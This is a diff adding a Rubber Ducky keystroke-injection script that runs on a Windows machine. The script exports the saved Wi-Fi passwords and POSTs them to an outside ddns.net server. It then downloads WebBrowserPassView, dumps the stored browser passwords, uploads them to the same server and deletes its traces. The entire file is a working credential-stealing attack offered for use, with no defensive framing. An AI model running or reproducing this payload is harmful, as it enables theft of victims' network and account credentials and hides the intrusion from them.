@@ -1,0 +1,101 @@
+REM Open CMD
+GUI r
+DELAY 500
+STRING CMD
+ENTER
+DELAY 500
+
+REM Change to Temp directory
+STRING cd %temp%
+ENTER
+DELAY 300
+
+REM Export Wi-Fi profiles
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+
+REM Extract Wi-Fi passwords
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+ENTER
+DELAY 500
+
+REM Send Wi-Fi passwords to server
+STRING powershell Invoke-WebRequest -Uri http://xoot404.ddns.net:4443/data.php -Method POST -InFile Wi-Fi-PASS
+ENTER
+DELAY 4000
+
+REM Clean up Wi-Fi files
+STRING del Wi-* /s /f /q
+ENTER
+DELAY 500
+
+
+REM Download and extract tools for browser passwords
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 4000
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip
+ENTER
+DELAY 2000
+STRING wbpv28821@
+ENTER
+STRING .\WebBrowserPassView.exe
+ENTER
+DELAY 2000
+CTRL A
+CTRL S
+DELAY 1000
+STRING export.html
+TAB
+STRING t
+DELAY 100
+ENTER
+DELAY 500
+ALT F4
+DELAY 500
+ALT F4
+GUI r
+DELAY 500
+STRING powershell
+DELAY 200
+ENTER
+DELAY 800
+STRING cd $env:USERPROFILE\Desktop
+DELAY 500
+ENTER
+REM Send the browser passwords to server
+STRING powershell Invoke-WebRequest -Uri http://xoot404.ddns.net:4443/data2.php -Method POST -InFile export.txt
+ENTER
+DELAY 1200
+STRING clear
+DELAY 50
+STRING Sart cleaning..
+DELAY 1000
+STRING clear
+ENTER
+REM Clean up temporary files
+STRING rm $env:USERPROFILE\Desktop\export.txt
+DELAY 300
+ENTER
+STRING cd c:/
+DELAY 500
+STRING rm -R \temp
+DELAY 400
+STRING t
+DELAY 450
+DELAY 400
+ENTER
+STRING EXIT
+ENTER
+DELAY 400
+ALT F4
+GUI R
+DELAY 400
+STRING rm -R /temp
+DELAY 400
+ENTER
+DELAY 600
+ALT F4
